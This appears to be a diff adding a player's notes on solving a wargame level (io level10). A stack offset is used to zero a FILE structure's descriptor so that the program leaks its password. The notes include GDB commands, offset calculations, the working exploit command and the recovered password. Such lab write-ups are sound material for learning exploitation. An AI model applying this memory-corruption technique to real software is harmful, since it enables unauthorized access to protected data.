@@ -1,0 +1,70 @@
+1.) It looks like we can put in a number that offset from the stack position, can reach the FILE* structure
+2.) The 4th byte starting at the FILE* structure is the file descriptor.  THe idea is, 0 this out to get the next read to read from the begining of the file.
+3.) So, get the offset from the stack position to the FILE pointer, then add 4.  If we give an integer for that offset, it should write the FD to 0!  Can we always get a consistant offset?
+
+5.) Offset 1208263568  this works with my test.  Can I modify the program to change it?
+    level10@io:/tmp/rar$ gcc ./test.c -O3 && ./a.out "asdfdd"
+    atoi value: 0
+    Pointer Value: 0x804a008
+    Stack Location: 0xbffffc58
+    Offset 1208263600
+    Our address 0xbffffc58
+    hi This is a test o
+    f some text.  THE E
+
+    Output from my test program.  The first FILE strcuture is ALWYAS located at address 0x804a008 but the stack position is of course variable
+    I need to use GDB to get the starting stack location of the char array, determine how many bytes away it is from this hardcoded address and then
+    yolo test it outside of GDB.  Since this is one byte, I need to setup the stack sizes EXACTLY.  Hit that offset+4 and bam.. password should print?
+
+
+- GDB Command to setup the cleanest environment:
+    env -i gdb /levels/level10
+    unset env LINES
+    unset env COLUMNS
+
+    (Keep in mind the stupid secret env variables SHELL and PWD that gdb always sets)
+
+- Now, we can't break too late because the read wont work, so break at *main+60 before the jumps end.  Also remember to try to pass a string avlue in roughly the size we think "123123123"
+    b *main+60
+    r "123123123"
+
+    p $ebp-0x58 (Looking at *main+14) = 0xbffffde0
+
+    0x804a008 - 0xbffffde0 = 1208263208
+
+- Ok that value is more characters than "123123123" so lets refind the stack location using exactly "1208263208" since that's the amount of character the real offset is likley to be:
+    p $ebp - 0x58 = 0xbffffde8
+
+    0x804a008 - 0xbffffde8 = 1208263200
+
+    Yay! 10 characters, let's just rerun in gdb real quick to make sure
+
+    p $ebp - 0x58 = 0xbffffde0
+
+
+    Alright!  Now we need to write 4 bytes + that final address, which means we write 4 bytes 'less' than this perfect offset (1208263200) so (1208263200 - 4) = 1208263196
+
+    
+- Now.. just run level10 w/ our environment setup correctly and cross fingers:
+    env -i PWD=/tmp/rar SHLVL=0 /levels/level10 "1208263196"
+
+
+- Ehh.. it didn't quite work but just adding 4 i got a crash.. I kept adding 4 and after 3 or 4 tries i got it :P
+
+    Working COmmand:
+        env -i PWD=/tmp/rar SHLVL=0 /levels/level10 "1208263212"
+    Result:
+        AveryLoNgPassword!!
+
+
+- Now run it with the proper password :D
+
+    /levels/level10 'AveryLoNgPassword!!'
+
+    (NOTE!  Use single quotes, otherwise bash interprets the BANG into some command nonesense and.. you get really weird results :P)
+
+
+
+    
+    
+
